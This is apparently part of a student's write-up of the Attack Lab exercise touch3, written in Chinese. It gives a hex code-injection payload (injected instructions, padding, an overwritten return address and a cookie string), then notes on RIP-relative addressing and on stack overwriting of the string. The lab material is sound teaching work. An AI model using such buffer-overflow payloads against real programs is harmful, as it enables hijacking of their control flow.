48 c7 c7 97 dc 61 55
68 fa 18 40 00
c3
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41
78 dc 61 55
35 39 62 39 39 37 66 61 00
```



做这个题遇到的一些小问题总结：

1. 

在以rip寄存器作为寻址访问内存时，rip的值要计算下一条指令的地址，如

```
   0x00000000004018fe <+4>:	movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
=> 0x0000000000401908 <+14>:	mov    %rdi,%rsi
```
计算内存地址时，rip的值要取0x401908，结果为0x401908+0x202bd4为0x6044dc

下面是有关cookie的汇编代码
```
=> 0x000000000040190b <+17>:	mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:	callq  0x40184c <hexmatch>
```
这里的edi值就应该为0x401911+0x202bd3 = 0x6044e4

2. 

关于字符串被覆盖的问题

![image-20210205154932213](C:\Users\xiaofei01\AppData\Roaming\Typora\typora-user-images\image-20210205154932213.png)

最后会因为调用hexmatch压入touch3的返回地址导致字符串被覆盖